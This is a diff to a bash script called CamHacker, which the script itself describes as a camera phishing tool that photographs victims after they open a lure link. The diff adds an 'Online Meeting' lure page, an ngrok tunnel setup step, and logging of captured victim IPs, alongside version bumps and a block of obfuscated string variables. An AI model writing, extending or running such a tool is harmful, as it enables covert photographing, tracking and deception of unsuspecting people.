@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # CamHacker
-# Version    : 1.1
+# Version    : 1.2
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
 # Author     : KasRoudra
 # Github     : https://github.com/KasRoudra
@@ -35,7 +35,7 @@ success="${cyan}[${white}√${cyan}] ${green}"
 z="
 ";Bz=' (ec';Qz='}Do ';Fz=' gre';Nz='o -e ';Iz='sR';Tz='al co';Sz='ste';Hz=' "Ka';Lz='then';Uz='de!"';Ez='go" |';Jz='dra"';Az='if !';Pz='rror';Oz='"${e';Rz='not ';Cz='ho "';Kz=')';Vz='ex';Mz='ech';Gz='p -q';Wz='fi';Dz='$lo';Yz='it';Zz='ou';
 
-version="1.1"
+version="1.2"
 
 cwd=`pwd`
 
@@ -46,7 +46,7 @@ ${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
 ${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
 ${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
 ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
-${red}                                            [v1.1]
+${red}                                            [v1.2]
 ${blue}                                    [By KasRoudra]
 "
 
@@ -116,6 +116,10 @@ replacer() {
         sed "s+forwarding_link+"$1"+g" LiveYTTV.html > index3.html
         sed "s+live_yt_tv+"$vid_id"+g" index3.html > index2.html
         rm -rf index3.html
+        break
+    elif echo $option | grep -q "4"; then
+        sed "s+forwarding_link+"$1"+g" template.php > index.php
+        sed "s+forwarding_link+"$1"+g" OnlineMeeting.html > index2.html
         break
     fi
     done
@@ -375,6 +379,19 @@ if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
         fi
 fi
 
+# Ngrok Authtoken
+if ! [[ -e $HOME/.ngrok2/ngrok.yml ]]; then
+    echo -e "\n${ask}Enter your ngrok authtoken:"
+    printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+    read auth
+    if [ -z $auth ]; then
+        echo -e "\n${error}No authtoken!\n\007"
+        sleep 1
+    else
+        cd $HOME/.ngrokfolder && ./ngrok authtoken ${auth}
+    fi
+fi
+
 # Start Point
 while true; do
 clear
@@ -385,7 +402,8 @@ echo -e "${ask}Choose a option:
 ${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
 ${cyan}[${white}2${cyan}] ${yellow}Festival
 ${cyan}[${white}3${cyan}] ${yellow}Live Youtube
-${cyan}[${white}4${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL} ${yellow})
+${cyan}[${white}4${cyan}] ${yellow}Online Meeting
+${cyan}[${white}c${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL} ${yellow})
 ${cyan}[${white}x${cyan}] ${yellow}About
 ${cyan}[${white}m${cyan}] ${yellow}More tools
 ${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
@@ -419,6 +437,9 @@ read option
             break
         fi
     elif echo $option | grep -q "4"; then
+        dir="om"
+        break
+    elif echo $option | grep -q "c"; then
         printf "\n${ask}Enter Directory:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
@@ -426,14 +447,14 @@ read option
             sleep 1
         else
             export FOL="$dire"
-            echo -e "\n${success}Directory changed succesfully!\n"
+            echo -e "\n${success}Directory changed successfully!\n"
             sleep 1
         fi
     elif echo $option | grep -q "x"; then
         clear
         echo -e "$logo"
         echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
-$red[Version]    ${cyan} :[1.1]
+$red[Version]    ${cyan} :[1.2]
 $red[Description]${cyan} :[Camera Phishing tool]
 $red[Author]     ${cyan} :[KasRoudra]
 $red[Github]     ${cyan} :[https://github.com/KasRoudra] 
@@ -537,6 +558,7 @@ while true; do
         while IFS= read -r line; do
             echo -e "${green}[${blue}*${green}]${yellow} $line"
         done < ip.txt
+        echo ""
         cat ip.txt >> $cwd/ips.txt
         rm -rf ip.txt
     fi
